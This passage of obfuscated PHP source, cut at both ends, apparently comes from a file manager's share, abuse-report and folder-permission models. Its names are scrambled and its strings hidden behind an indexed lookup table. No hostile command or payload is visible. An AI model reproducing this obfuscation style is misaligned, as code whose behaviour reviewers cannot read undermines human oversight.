($Óô´Úîé[$ŸŒ£ãÁö[1939]]) { $ŞùÅÌú[$ŸŒ£ãÁö[1939]] = $Óô´Úîé[$ŸŒ£ãÁö[1939]]; } else { if ($Óô´Úîé[$ŸŒ£ãÁö[1995]]) { $ŞùÅÌú[$ŸŒ£ãÁö[1995]] = $Óô´Úîé[$ŸŒ£ãÁö[1995]]; } } $ÇÇãå‰[] = $ŞùÅÌú; } return $¤›¹È„->addAll($ÇÇãå‰, array(), !0); } public function numViewAdd($¤³ãäô§) { $©¨”İ¾İ =& $_SERVER[ñ÷§¡å]; $ÚßªÅó€ = array($©¨”İ¾İ[497] => $¤³ãäô§); $this->where($ÚßªÅó€)->setAdd($©¨”İ¾İ[1992]); } public function numDownloadAdd($åáïÓåÕ) { $ë¡°Õ×¬ =& $_SERVER[ñ÷§¡å]; $İƒ¡¨×¼ = array($ë¡°Õ×¬[497] => $åáïÓåÕ); $this->where($İƒ¡¨×¼)->setAdd($ë¡°Õ×¬[1993]); } protected function shareEdit($¸êÕ‹áğ, $êÆûóÄÃ) { $½¾›§—¡ =& $_SERVER[ñ÷§¡å]; $Ëƒ×ïö— = $this->getInfo($¸êÕ‹áğ); if (!$Ëƒ×ïö—) { return !1; } $this->_checkLinkShare($êÆûóÄÃ, $Ëƒ×ïö—); $«¸Úø’ = array(); $æú¾ãØ¥ = explode($½¾›§—¡[50], $½¾›§—¡[1996]); foreach ($æú¾ãØ¥ as $÷Ë°Èá) { if (!array_key_exists($÷Ë°Èá, $êÆûóÄÃ)) { continue; } $«¸Úø’[$÷Ë°Èá] = $êÆûóÄÃ[$÷Ë°Èá]; } $this->shareEventAdd($Ëƒ×ïö—[$½¾›§—¡[411]], $êÆûóÄÃ, $½¾›§—¡[1805]); $this->where(array($½¾›§—¡[497] => $¸êÕ‹áğ))->save($«¸Úø’); if (isset($êÆûóÄÃ[$½¾›§—¡[1985]])) { $this->_shareAuthSet($¸êÕ‹áğ, $êÆûóÄÃ[$½¾›§—¡[1985]]); } return !0; } private function _checkLinkShare($Ş˜ÓšÉ¿, $’„ò¹ú¯) { $²ñ”œü’ =& $_SERVER[ñ÷§¡å]; if ($Ş˜ÓšÉ¿[$²ñ”œü’[503]] != $²ñ”œü’[98]) { return; } $’›é§› = $’„ò¹ú¯[$²ñ”œü’[96]][$²ñ”œü’[411]]; if ($’„ò¹ú¯[$²ñ”œü’[96]][$²ñ”œü’[33]] != $²ñ”œü’[209]) { $à³“ñİš = $this->_folderReport($’›é§›); if (!$à³“ñİš) { return; } show_json(LNG($²ñ”œü’[1997]) . $²ñ”œü’[1998] . $à³“ñİš, !1); } $›åÓ¦óÏ = Model($²ñ”œü’[838])->fileInfoGet($’„ò¹ú¯[$²ñ”œü’[96]][$²ñ”œü’[411]]); if (!$›åÓ¦óÏ) { return; } $à†÷üıà = $this->shareFileMeta($›åÓ¦óÏ[$²ñ”œü’[477]]); if (isset($à†÷üıà[$²ñ”œü’[383]]) && $à†÷üıà[$²ñ”œü’[383]] == $²ñ”œü’[98]) { show_json(LNG($²ñ”œü’[1999]), !1); } } private function _folderReport($»æ“¸€) { $š©ô£™· =& $_SERVER[ñ÷§¡å]; $ôêÓÒŠ” = array($š©ô£™·[477] => array($š©ô£™·[1019], 0), $š©ô£™·[763] => 3); $ÂµÀÇ¤µ = Model($š©ô£™·[2000])->where($ôêÓÒŠ”)->field($š©ô£™·[477])->select(); if (!$ÂµÀÇ¤µ) { return !1; } $ÂµÀÇ¤µ = array_to_keyvalue($ÂµÀÇ¤µ, $š©ô£™·[12], $š©ô£™·[477]); $öª®ÕíŠ = $š©ô£™·[50] . $»æ“¸€ . $š©ô£™·[50]; $ôêÓÒŠ” = array($š©ô£™·[477] => array($š©ô£™·[7], $ÂµÀÇ¤µ), $š©ô£™·[530] => array($š©ô£™·[392], "\x25{$öª®ÕíŠ}\45"), $š©ô£™·[440] => 0); $ÆŸĞªÃ¢ = Model($š©ô£™·[838])->where($ôêÓÒŠ”)->field($š©ô£™·[2001])->find(); if (!$ÆŸĞªÃ¢) { return !1; } $¥ìÑÊéİ = substr($ÆŸĞªÃ¢[$š©ô£™·[530]], strpos($ÆŸĞªÃ¢[$š©ô£™·[530]], $öª®ÕíŠ)); $ôêÓÒŠ” = array($š©ô£™·[411] => array($š©ô£™·[7], trim($¥ìÑÊéİ, $š©ô£™·[50]))); $É¸æı¼Î = Model($š©ô£™·[838])->where($ôêÓÒŠ”)->field($š©ô£™·[32])->select(); $´éİÔÇ¹ = array_to_keyvalue($É¸æı¼Î, $š©ô£™·[12], $š©ô£™·[32]); $´éİÔÇ¹[] = $ÆŸĞªÃ¢[$š©ô£™·[32]]; return implode($š©ô£™·[8], $´éİÔÇ¹); } protected function remove($ÉØêúÁ’) { $Õµâé§µ =& $_SERVER[ñ÷§¡å]; if (is_array($ÉØêúÁ’)) { $ÉØêúÁ’ = array($Õµâé§µ[7], $ÉØêúÁ’); } $Ñ»ÌÕäÂ = array($Õµâé§µ[498] => $ÉØêúÁ’); $‰˜¡àƒš = $this->where($Ñ»ÌÕäÂ)->delete(); if ($‰˜¡àƒš) { Model($Õµâé§µ[611])->where(array($Õµâé§µ[498] => $ÉØêúÁ’))->delete(); } $¶æûÆ… = is_array($ÉØêúÁ’) ? $ÉØêúÁ’[1] : array($ÉØêúÁ’); for ($è˜²Äûë = 0; $è˜²Äûë < count($¶æûÆ…); $è˜²Äûë++) { $Õ÷‚Ş¹ = $this->getInfo($¶æûÆ…[$è˜²Äûë]); if ($Õ÷‚Ş¹[$Õµâé§µ[505]] == $Õµâé§µ[98]) { Model($Õµâé§µ[579])->eventShare($Õ÷‚Ş¹[$Õµâé§µ[411]], $Õµâé§µ[1990]); } if ($Õ÷‚Ş¹[$Õµâé§µ[503]] == $Õµâé§µ[98]) { Model($Õµâé§µ[579])->eventShare($Õ÷‚Ş¹[$Õµâé§µ[411]], $Õµâé§µ[1989]); } } return $‰˜¡àƒš; } protected function removeBySource($¡ù¦ƒÀ…) { $Ëƒşš¥¿ =& $_SERVER[ñ÷§¡å]; $ÌÎèÜ¢ = array($Ëƒşš¥¿[426] => array($Ëƒşš¥¿[427], $¡ù¦ƒÀ…)); $éôØæÓÂ = $this->field($Ëƒşš¥¿[498])->where($ÌÎèÜ¢)->select(); $éôØæÓÂ = array_to_keyvalue($éôØæÓÂ, $Ëƒşš¥¿[12], $Ëƒşš¥¿[498]); if (!$éôØæÓÂ) { return; } $ÌÎèÜ¢ = array($Ëƒşš¥¿[497] => array($Ëƒşš¥¿[427], $éôØæÓÂ)); $this->where($ÌÎèÜ¢)->delete(); Model($Ëƒşš¥¿[611])->where($ÌÎèÜ¢)->delete(); } public function listAll($‘êƒ –) { $±ÖÈØò =& $_SERVER[ñ÷§¡å]; $˜›¥ªş´ = array(); if ($‘êƒ –[$±ÖÈØò[1663]]) { $˜›¥ªş´[$±ÖÈØò[1663]] = $‘êƒ –[$±ÖÈØò[1663]]; } if ($‘êƒ –[$±ÖÈØò[774]]) { $ØûÇ´’ë = $‘êƒ –[$±ÖÈØò[506]] ? $‘êƒ –[$±ÖÈØò[506]] : strtotime(date($±ÖÈØò[2002])); $˜›¥ªş´[$±ÖÈØò[210]] = array($±ÖÈØò[342], array($‘êƒ –[$±ÖÈØò[774]], $ØûÇ´’ë)); } if ($‘êƒ –[$±ÖÈØò[33]]) { $˜›¥ªş´[$‘êƒ –[$±ÖÈØò[33]]] = 1; } else { $˜›¥ªş´[] = array($±ÖÈØò[503] => array($±ÖÈØò[1019], 0), $±ÖÈØò[505] => array($±ÖÈØò[1019], 0), $±ÖÈØò[1979] => $±ÖÈØò[1933]); } if ($‘êƒ –[$±ÖÈØò[1929]]) { $˜›¥ªş´[] = array($±ÖÈØò[500] => $‘êƒ –[$±ÖÈØò[1929]], $±ÖÈØò[1562] => array($±ÖÈØò[392], "\45{$‘êƒ –[$±ÖÈØò[1929]]}\45"), $±ÖÈØò[1979] => $±ÖÈØò[1933]); } $åäîçæ¼ = $this->_makeOrder()->where($˜›¥ªş´)->selectPage(20); if (empty($åäîçæ¼[$±ÖÈØò[378]])) { return array(); } $this->_listDataApply($åäîçæ¼[$±ÖÈØò[378]]); return $åäîçæ¼; } public function listDataApply($ˆ‘Å«œ›) { $this->_listDataApply($ˆ‘Å«œ›); return $ˆ‘Å«œ›; } private function _listDataApply(&$úÙ÷»††) { $Ğ‰ öÔ® =& $_SERVER[ñ÷§¡å]; $¸ö˜°ç’ = array_to_keyvalue($úÙ÷»††, $Ğ‰ öÔ®[12], $Ğ‰ öÔ®[1663]); $’â‚ˆĞ† = Model($Ğ‰ öÔ®[544])->userListInfo(array_unique($¸ö˜°ç’)); $ü°ĞÂ¶ = array_to_keyvalue($úÙ÷»††, $Ğ‰ öÔ®[12], $Ğ‰ öÔ®[411]); $·»ºşÔı = Model($Ğ‰ öÔ®[838])->sourceListInfo($ü°ĞÂ¶, !0); foreach ($úÙ÷»†† as $µéˆŸóä => &$ş’éĞÇ) { $Ü•ëÚÄÕ = $ş’éĞÇ[$Ğ‰ öÔ®[1663]]; $ş’éĞÇ[$Ğ‰ öÔ®[2003]] = $’â‚ˆĞ†[$Ü•ëÚÄÕ] ? $’â‚ˆĞ†[$Ü•ëÚÄÕ] : !1; $˜şÖå’® = $ş’éĞÇ[$Ğ‰ öÔ®[411]]; $ş’éĞÇ[$Ğ‰ öÔ®[96]] = $·»ºşÔı[$˜şÖå’®] ? $·»ºşÔı[$˜şÖå’®] : !1; if ($ş’éĞÇ[$Ğ‰ öÔ®[96]][$Ğ‰ öÔ®[440]] == $Ğ‰ öÔ®[98]) { unset($úÙ÷»††[$µéˆŸóä]); } if ($ş’éĞÇ[$Ğ‰ öÔ®[96]] != $Ğ‰ öÔ®[207] && !$ş’éĞÇ[$Ğ‰ öÔ®[96]]) { unset($úÙ÷»††[$µéˆŸóä]); } } unset($ş’éĞÇ); $úÙ÷»†† = array_values($úÙ÷»††); } private function _makeOrder($³‹‚¼•¢ = '') { $©ìÁõ¸Ô =& $_SERVER[ñ÷§¡å]; $œğÓñ¤Ü = array($©ìÁõ¸Ô[210], $©ìÁõ¸Ô[506], $©ìÁõ¸Ô[1992], $©ìÁõ¸Ô[1993]); $ıÕ¯ı Õ = array($©ìÁõ¸Ô[459] => $©ìÁõ¸Ô[460], $©ìÁõ¸Ô[461] => $©ìÁõ¸Ô[462]); $±Êû´î› = Input::get($©ìÁõ¸Ô[466], $©ìÁõ¸Ô[7], $©ìÁõ¸Ô[432], $œğÓñ¤Ü); $àÙ·¦à® = Input::get($©ìÁõ¸Ô[467], $©ìÁõ¸Ô[7], $©ìÁõ¸Ô[2004], array($©ìÁõ¸Ô[1926], $©ìÁõ¸Ô[461])); $àÙ·¦à® = $ıÕ¯ı Õ[$àÙ·¦à®]; $³‹‚¼•¢ = $³‹‚¼•¢ . "{$±Êû´î›}\40{$àÙ·¦à®}"; return $this->order($³‹‚¼•¢); } public function reportAdd($Œúš¶°¨) { $‡¸ÏºËÓ =& $_SERVER[ñ÷§¡å]; $ŸŠÀŒËƒ = array($‡¸ÏºËÓ[498] => $Œúš¶°¨[$‡¸ÏºËÓ[498]], $‡¸ÏºËÓ[1663] => USER_ID); if (Model($‡¸ÏºËÓ[2000])->where($ŸŠÀŒËƒ)->find()) { return !1; } $úÁØ±ŠŒ = array($‡¸ÏºËÓ[498] => $Œúš¶°¨[$‡¸ÏºËÓ[498]], $‡¸ÏºËÓ[1562] => $Œúš¶°¨[$‡¸ÏºËÓ[1562]], $‡¸ÏºËÓ[411] => $Œúš¶°¨[$‡¸ÏºËÓ[411]], $‡¸ÏºËÓ[477] => $Œúš¶°¨[$‡¸ÏºËÓ[477]], $‡¸ÏºËÓ[1663] => USER_ID, $‡¸ÏºËÓ[33] => $Œúš¶°¨[$‡¸ÏºËÓ[33]], $‡¸ÏºËÓ[462] => $Œúš¶°¨[$‡¸ÏºËÓ[462]]); return Model($‡¸ÏºËÓ[2000])->add($úÁØ±ŠŒ); } public function reportList($®Á·ÉŠË) { $…ûºÌ· =& $_SERVER[ñ÷§¡å]; $¯ÏÔÑÒ™ = array(); if ($®Á·ÉŠË[$…ûºÌ·[774]]) { $­Ç¶µä× = $®Á·ÉŠË[$…ûºÌ·[506]] ? $®Á·ÉŠË[$…ûºÌ·[506]] : strtotime(date($…ûºÌ·[2002])); $¯ÏÔÑÒ™[$…ûºÌ·[210]] = array($…ûºÌ·[342], array($®Á·ÉŠË[$…ûºÌ·[774]], $­Ç¶µä×)); } if (isset($®Á·ÉŠË[$…ûºÌ·[33]]) && in_array($®Á·ÉŠË[$…ûºÌ·[33]], array($…ûºÌ·[98], $…ûºÌ·[446], $…ûºÌ·[2005], $…ûºÌ·[2006], $…ûºÌ·[2007]))) { $¯ÏÔÑÒ™[$…ûºÌ·[33]] = $®Á·ÉŠË[$…ûºÌ·[33]]; } if (isset($®Á·ÉŠË[$…ûºÌ·[763]]) && in_array($®Á·ÉŠË[$…ûºÌ·[763]], array($…ûºÌ·[207], $…ûºÌ·[98], $…ûºÌ·[446], $…ûºÌ·[2005]))) { $¯ÏÔÑÒ™[$…ûºÌ·[763]] = $®Á·ÉŠË[$…ûºÌ·[763]]; } $˜ıƒô˜í = Input::get($…ûºÌ·[467], $…ûºÌ·[7], $…ûºÌ·[2004], array($…ûºÌ·[1926], $…ûºÌ·[461])); $—ƒ¦ëãš = array($…ûºÌ·[459] => $…ûºÌ·[460], $…ûºÌ·[461] => $…ûºÌ·[462]); $‹ÓºâÑÖ = $…ûºÌ·[2008] . $—ƒ¦ëãš[$˜ıƒô˜í]; $ØšÀÕäù = Model($…ûºÌ·[2000])->where($¯ÏÔÑÒ™)->order($‹ÓºâÑÖ)->selectPage(20); if (empty($ØšÀÕäù[$…ûºÌ·[378]])) { return array(); } $ÇÙ¼â÷ê = array_to_keyvalue_group($ØšÀÕäù[$…ûºÌ·[378]], $…ûºÌ·[763], $…ûºÌ·[498]); if (!empty($ÇÙ¼â÷ê[0])) { $®Á·ÉŠË = $ÇÙ¼â÷ê[0]; $¯ÏÔÑÒ™ = array($…ûºÌ·[498] => array($…ûºÌ·[7], $®Á·ÉŠË)); $Çî¼²¼ = $this->where($¯ÏÔÑÒ™)->field($…ûºÌ·[498])->select(); $Çî¼²¼ = array_to_keyvalue($Çî¼²¼, $…ûºÌ·[12], $…ûºÌ·[498]); $‘è‚ûµ = array_diff($®Á·ÉŠË, $Çî¼²¼); if (!empty($‘è‚ûµ)) { foreach ($ØšÀÕäù[$…ûºÌ·[378]] as $˜¦—Ç¢Ò => $‰‡‘òœœ) { if (in_array($‰‡‘òœœ[$…ûºÌ·[498]], $‘è‚ûµ)) { unset($ØšÀÕäù[$…ûºÌ·[378]][$˜¦—Ç¢Ò]); } } } } $this->_listDataApply($ØšÀÕäù[$…ûºÌ·[378]]); return $ØšÀÕäù; } public function reportStatus($ãì÷À÷æ) { $Ñ·ìæ =& $_SERVER[ñ÷§¡å]; $úí›Ûóã = array($Ñ·ìæ[408] => $ãì÷À÷æ[$Ñ·ìæ[408]]); $‚™÷ÁÛÑ = Model($Ñ·ìæ[2000])->where($úí›Ûóã)->field($Ñ·ìæ[2009])->find(); if (!$‚™÷ÁÛÑ) { return !1; } $ÀÏ¥™ = array($Ñ·ìæ[763] => $ãì÷À÷æ[$Ñ·ìæ[763]]); if ($ãì÷À÷æ[$Ñ·ìæ[763]] == $Ñ·ìæ[2005] && $‚™÷ÁÛÑ[$Ñ·ìæ[763]] == $Ñ·ìæ[2005]) { $ÀÏ¥™[$Ñ·ìæ[763]] = 0; } $õéáß­ä = Model($Ñ·ìæ[2000])->where($úí›Ûóã)->save($ÀÏ¥™); if ($ãì÷À÷æ[$Ñ·ìæ[763]] == $Ñ·ìæ[446]) { if ($‚™÷ÁÛÑ[$Ñ·ìæ[477]] != $Ñ·ìæ[207] && $this->shareFileMeta($‚™÷ÁÛÑ[$Ñ·ìæ[477]])) { $this->shareFileMeta($‚™÷ÁÛÑ[$Ñ·ìæ[477]], 0); } $this->remove($‚™÷ÁÛÑ[$Ñ·ìæ[498]]); return !0; } if ($õéáß­ä && $ãì÷À÷æ[$Ñ·ìæ[763]] == $Ñ·ìæ[2005]) { $Œ÷³–ê† = $ÀÏ¥™[$Ñ·ìæ[763]] == $Ñ·ìæ[2005] ? 1 : 0; $this->shareFileMeta($‚™÷ÁÛÑ[$Ñ·ìæ[477]], $Œ÷³–ê†); $this->removeByFile($‚™÷ÁÛÑ[$Ñ·ìæ[477]]); } return $õéáß­ä; } private function removeByFile($ÉÉÌÁª‹) { $®ı«²ö¬ =& $_SERVER[ñ÷§¡å]; $ÊÛ¯àëĞ = Model($®ı«²ö¬[838])->where(array($®ı«²ö¬[477] => $ÉÉÌÁª‹))->field($®ı«²ö¬[411])->select(); $Ş¦ãª×ˆ = array_to_keyvalue($ÊÛ¯àëĞ, $®ı«²ö¬[12], $®ı«²ö¬[411]); $Üıı‰å÷ = array($®ı«²ö¬[411] => array($®ı«²ö¬[7], $Ş¦ãª×ˆ), $®ı«²ö¬[503] => 1); $ÊÛ¯àëĞ = $this->where($Üıı‰å÷)->field($®ı«²ö¬[498])->select(); if (empty($ÊÛ¯àëĞ)) { return; } $¢•­Ò·¥ = array_to_keyvalue($ÊÛ¯àëĞ, $®ı«²ö¬[12], $®ı«²ö¬[498]); $this->remove($¢•­Ò·¥); } private function shareFileMeta($ıÇì¸ÈÀ, $ÎÒØ®é = null) { $í„”©êš =& $_SERVER[ñ÷§¡å]; $´±´”ƒõ = array($í„”©êš[477] => $ıÇì¸ÈÀ, $í„”©êš[104] => $í„”©êš[2010]); if (is_null($ÎÒØ®é)) { return Model($í„”©êš[2011])->where($´±´”ƒõ)->find(); } $´±´”ƒõ[$í„”©êš[383]] = $ÎÒØ®é; Model($í„”©êš[2011])->add($´±´”ƒõ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\143\x65\x5f\141\x75\164\x68"; public function getAuth($Ş¥Á‰Éœ) { $¯ñõüÍë =& $_SERVER[ñ÷§¡å]; $µö‰«Ê¨ = $this->sourceAuthSelect($Ş¥Á‰Éœ); $¢Ì’íœ€ = array(); $€°Æ¨¾¹ = array(); $´‘ü“ì— = 2 << 25; foreach ($µö‰«Ê¨ as $éûé°·Ü) { $Áàíõ¤½ = Model($¯ñõüÍë[516])->listData($éûé°·Ü[$¯ñõüÍë[1939]]); if (!$Áàíõ¤½) { continue; } $¢Ì’íœ€[] = $éûé°·Ü; $ßíö£œË = 0; if ($éûé°·Ü[$¯ñõüÍë[420]] == SourceModel::TYPE_GROUP) { $ßíö£œË = $´‘ü“ì— * 2; } if ($éûé°·Ü[$¯ñõüÍë[420]] == SourceModel::TYPE_USER) { $ßíö£œË = $´‘ü“ì—; } if ($éûé°·Ü[$¯ñõüÍë[420]] == SourceModel::TYPE_USER && $éûé°·Ü[$¯ñõüÍë[514]] == $¯ñõüÍë[207]) { $ßíö£œË = 0; } $€°Æ¨¾¹[] = $Áàíõ¤½[$¯ñõüÍë[422]] + $ßíö£œË; } array_multisort($€°Æ¨¾¹, SORT_DESC, $¢Ì’íœ€); return $¢Ì’íœ€; } public function sourceAuthSelect($ıü´¼ı) { $Ø…í’æ€ =& $_SERVER[ñ÷§¡å]; static $„Ğë–Û = array(); $­ìÛóƒ‰ = is_array($ıü´¼ı) ? !1 : !0; if ($­ìÛóƒ‰) { $ıü´¼ı = array($ıü´¼ı); } $Ì¤·–ı© = array(); foreach ($ıü´¼ı as $Æƒçúù°) { if (isset($„Ğë–Û[$Æƒçúù°])) { $Ì¤·–ı©[$Æƒçúù°] = $„Ğë–Û[$Æƒçúù°]; } } if (count($Ì¤·–ı©) == count($ıü´¼ı)) { return $­ìÛóƒ‰ ? $Ì¤·–ı©[$ıü´¼ı[0]] : $Ì¤·–ı©; } $ô¼“‘™º = $Ø…í’æ€[2012]; $¨ÊÉæ„“ = array($Ø…í’æ€[411] => array($Ø…í’æ€[7], $ıü´¼ı)); $ ê§´­£ = $this->field($ô¼“‘™º)->order($Ø…í’æ€[408])->where($¨ÊÉæ„“)->select(); $×ë„®èú = array_to_keyvalue_group($ ê§´­£, $Ø…í’æ€[411]); foreach ($ıü´¼ı as $Æƒçúù°) { $„Ğë–Û[$Æƒçúù°] = $×ë„®èú[$Æƒçúù°] ? $×ë„®èú[$Æƒçúù°] : array(); } if ($­ìÛóƒ‰) { return $ ê§´­£; } return $×ë„®èú; } public function setAuth($¦õÍØ£É, $·Â¸áîŠ) { $è§—õ¼ =& $_SERVER[ñ÷§¡å]; $•ƒ‹£”¾ = Model($è§—õ¼[1334])->sourceInfo($¦õÍØ£É); if (!$•ƒ‹£”¾) { return !1; } if ($•ƒ‹£”¾[$è§—õ¼[420]] != SourceModel::TYPE_GROUP) { return !1; } $ıÑ§Ñµƒ = 1; $ÕÑİ‘¾İ = $•ƒ‹£”¾[$è§—õ¼[514]]; if ($ÕÑİ‘¾İ != $ıÑ§Ñµƒ) { $’çÖŠ˜ò = array($è§—õ¼[1835] => $ÕÑİ‘¾İ); $¦óŸĞ = Model($è§—õ¼[1925])->field($è§—õ¼[1663])->where($’çÖŠ˜ò)->select(); $¦óŸĞ = array_to_keyvalue($¦óŸĞ, $è§—õ¼[12], $è§—õ¼[1663]); } $İ÷½óÃ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $öñ±ƒ†è = array(); foreach ($·Â¸áîŠ as $¿£İõóç) { if (!in_array($¿£İõóç[$è§—õ¼[420]], $İ÷½óÃ)) { show_json(LNG($è§—õ¼[2013]), !1); } if ($ÕÑİ‘¾İ != $ıÑ§Ñµƒ) { if ($¿£İõóç[$è§—õ¼[420]] == SourceModel::TYPE_GROUP) { } if ($¿£İõóç[$è§—õ¼[514]] != 0 && !in_array($¿£İõóç[$è§—õ¼[514]], $¦óŸĞ)) { } } if ($¿£İõóç[$è§—õ¼[514]] == 0) { $¿£İõóç[$è§—õ¼[420]] = SourceModel::TYPE_USER; } $öñ±ƒ†è[] = array($è§—õ¼[411] => $¦õÍØ£É, $è§—õ¼[420] => intval($¿£İõóç[$è§—õ¼[420]]), $è§—õ¼[514] => intval($¿£İõóç[$è§—õ¼[514]]), $è§—õ¼[1939] => intval($¿£İõóç[$è§—õ¼[1939]]) ? intval($¿£İõóç[$è§—õ¼[1939]]) : 0, $è§—õ¼[1995] => intval($¿£İõóç[$è§—õ¼[1995]]) ? intval($¿£İõóç[$è§—õ¼[1995]]) : -1); } $this->where(array($è§—õ¼[426] => $¦õÍØ£É))->delete(); $this->addAll($öñ±ƒ†è); return !0; } public function authClear($çß£´…Š) { $óšğ†·õ =& $_SERVER[ñ÷§¡å]; $æ‚ºÛÛà = Model($óšğ†·õ[1334])->sourceInfo($çß£´…Š); $üîì–­Ò = array($çß£´…Š); if ($æ‚ºÛÛà[$óšğ†·õ[419]] == $óšğ†·õ[98]) { $¶ í×„± = array($óšğ†·õ[599] => array($óšğ†·õ[559], $æ‚ºÛÛà[$óšğ†·õ[530]] . $çß£´…Š . $óšğ†·õ[560])); $üîì–­Ò = Model($óšğ†·õ[1334])->field($óšğ†·õ[426])->where($¶ í×„±)->getField($óšğ†·õ[411], !0); $üîì–­Ò[] = $çß£´…Š; } $this->where(array($óšğ†·õ[426] => array($óšğ†·õ[427], $üîì–­Ò)))->delete(); return !0; } public function getAllChildren($ß¡°ê‡) { $½Ä…í­Ò =& $_SERVER[ñ÷§¡å]; $öÙåşõ = Model($½Ä…í­Ò[1334])->sourceInfo($ß¡°ê‡); if ($öÙåşõ[$½Ä…í­Ò[419]] != $½Ä…í­Ò[98]) { return $this->sourceListAuth(array($ß¡°ê‡)); } if ($öÙåşõ[$½Ä…í­Ò[420]] != SourceModel::TYPE_GROUP) { return array(); } $…ƒÒ¤†  = 1; $¢œæœùõ = array($ß¡°ê‡); if ($öÙåşõ[$½Ä…í­Ò[441]] == $½Ä…í­Ò[207] && $öÙåşõ[$½Ä…í­Ò[514]] != $…ƒÒ¤† ) { $¢œæœùõ = $this->groupChidldAllRootSource($öÙåşõ[$½Ä…í­Ò[514]]); } $ü£¥³‡Ã = $this->field($½Ä…í­Ò[411])->group($½Ä…í­Ò[411])->select(); $ü£¥³‡Ã = array_to_keyvalue($ü£¥³‡Ã, $½Ä…í­Ò[12], $½Ä…í­Ò[411]); if (!$ü£¥³‡Ã) { return array(); } $€²Ğ²”Ø = $½Ä…í­Ò[2014]; $¼Œ­ëÉ° = array($½Ä…í­Ò[411] => array($½Ä…í­Ò[7], $ü£¥³‡Ã), $½Ä…í­Ò[440] => $½Ä…í­Ò[207]); $×ğ•ä¯û = Model($½Ä…í­Ò[838])->field($€²Ğ²”Ø)->where($¼Œ­ëÉ°)->select(); $§¥á²ì… = array($ß¡°ê‡); foreach ($×ğ•ä¯û as $é»¿†ò) { foreach ($¢œæœùõ as $Ì¥Í·¼µ) { $Í‚œ™ = $½Ä…í­Ò[50] . $Ì¥Í·¼µ . $½Ä…í­Ò[50]; $û‘„·»¿ = $é»¿†ò[$½Ä…í­Ò[530]] . $é»¿†ò[$½Ä…í­Ò[411]] . $½Ä…í­Ò[50]; if (strstr($û‘„·»¿, $Í‚œ™)) { $§¥á²ì…[] = $é»¿†ò[$½Ä…í­Ò[411]]; break; } } } return $this->sourceListAuth($§¥á²ì…); } private function sourceListAuth($ş¡³¥Â÷) { $å¨”™»á =& $_SERVER[ñ÷§¡å]; $úòôÑ×‚ = Model($å¨”™»á[1334])->sourceListInfo($ş¡³¥Â÷, !0); $†ëğ¤©Â = $this->sourceAuthSelect($ş¡³¥Â÷); $„¨ÂÃğ£ = array(); $æ‘Ú»ŸÈ = array(); foreach ($úòôÑ×‚ as $ÁİŠ­éÊ) { unset($ÁİŠ­éÊ[$å¨”™»á[465]]); unset($ÁİŠ­éÊ[$å¨”™»á[463]]); unset($ÁİŠ­éÊ[$å¨”™»á[422]]); unset($ÁİŠ­éÊ[$å¨”™»á[96]]); $¥’à–§€ = $†ëğ¤©Â[$ÁİŠ­éÊ[$å¨”™»á[411]]]; if (!$¥’à–§€) { continue; } $ÁİŠ­éÊ[$å¨”™»á[2015]] = $this->authTargetInfo($¥’à–§€); $ÁİŠ­éÊ[$å¨”™»á[528]] = rtrim($ÁİŠ­éÊ[$å¨”™»á[534]], $å¨”™»á[8]) . $å¨”™»á[8] . ltrim($ÁİŠ­éÊ[$å¨”™»á[528]], $å¨”™»á[8]); $„¨ÂÃğ£[] = $ÁİŠ­éÊ; $Ê‡ËÃŞ = count(explode($å¨”™»á[8], trim($ÁİŠ­éÊ[$å¨”™»á[528]], $å¨”™»á[8]))); $æ‘Ú»ŸÈ[] = $Ê‡ËÃŞ + ($ÁİŠ­éÊ[$å¨”™»á[33]] == $å¨”™»á[85] ? 0 : 1000); } array_multisort($æ‘Ú»ŸÈ, SORT_ASC, $„¨ÂÃğ£); return $„¨ÂÃğ£; } private function groupChidldAllRootSource($‘¸ù¸°) { $€Ğ–åğ÷ =& $_SERVER[ñ÷§¡å]; $Ÿ˜Ç½®Õ = Model($€Ğ–åğ÷[2016])->groupChildrenAll($‘¸ù¸°); $åÉ¦“ = array($€Ğ–åğ÷[441] => 0, $€Ğ–åğ÷[514] => array($€Ğ–åğ÷[7], $Ÿ˜Ç½®Õ), $€Ğ–åğ÷[420] => SourceModel::TYPE_GROUP); $ø¾²¢½Ñ = Model($€Ğ–åğ÷[838])->field($€Ğ–åğ÷[411])->where($åÉ¦“)->select(); $ø¾²¢½Ñ = array_to_keyvalue($ø¾²¢½Ñ, $€Ğ–åğ÷[12], $€Ğ–åğ÷[411]); return $ø¾²¢½Ñ; } private function authTargetInfo($ê‘Îâ•¿) { $˜–—Òã× =& $_SERVER[ñ÷§¡å]; $‰‰·ê¦Ş = array(); $¿ìãİ“Ê = array(); $ºŞÄÜ®… = 2 << 25; foreach ($ê‘Îâ•¿ as $Çá Ëø) { $œ¦Ûş¥“ = Model($˜–—Òã×[516])->listData($Çá Ëø[$˜–—Òã×[1939]]); if (!$œ¦Ûş¥“) { continue; } if ($Çá Ëø[$˜–—Òã×[420]] == SourceModel::TYPE_USER) { $Ú¸ûÊ€Ü = Model($˜–—Òã×[522])->getInfoSimpleOuter($Çá Ëø[$˜–—Òã×[514]]); if ($Ú¸ûÊ€Ü[$˜–—Òã×[1663]] == $˜–—Òã×[1197]) { continue; } if ($Ú¸ûÊ€Ü[$˜–—Òã×[1663]] == $˜–—Òã×[207]) { $Ú¸ûÊ€Ü[$˜–—Òã×[32]] = LNG($˜–—Òã×[2017]); } } else { $Ú¸ûÊ€Ü = Model($˜–—Òã×[531])->getInfoSimple($Çá Ëø[$˜–—Òã×[514]]); } if (!$Ú¸ûÊ€Ü) { continue; } $Ú¸ûÊ€Ü[$˜–—Òã×[476]] = $œ¦Ûş¥“; $‰‰·ê¦Ş[] = $Ú¸ûÊ€Ü; $è­²¿œÙ = 0; if ($Çá Ëø[$˜–—Òã×[420]] == SourceModel::TYPE_GROUP) { $è­²¿œÙ = $ºŞÄÜ®… * 2; } if ($Çá Ëø[$˜–—Òã×[420]] == SourceModel::TYPE_USER) { $è­²¿œÙ = $ºŞÄÜ®…; } if ($Çá Ëø[$˜–—Òã×[420]] == SourceModel::TYPE_USER && $Çá Ëø[$˜–—Òã×[514]] == $˜–—Òã×[207]) { $è­²¿œÙ = 0; } $¿ìãİ“Ê[] = $œ¦Ûş¥“[$˜–—Òã×[422]] + $è­²¿œÙ; } array_multisort($¿ìãİ“Ê, SORT_DESC, $‰‰·ê¦Ş); return $‰‰·ê¦Ş; } public function getAllChildrenByUser($©Œœ°ÎÆ, $æŞÀ¦œ°) { $õ§ûç• =& 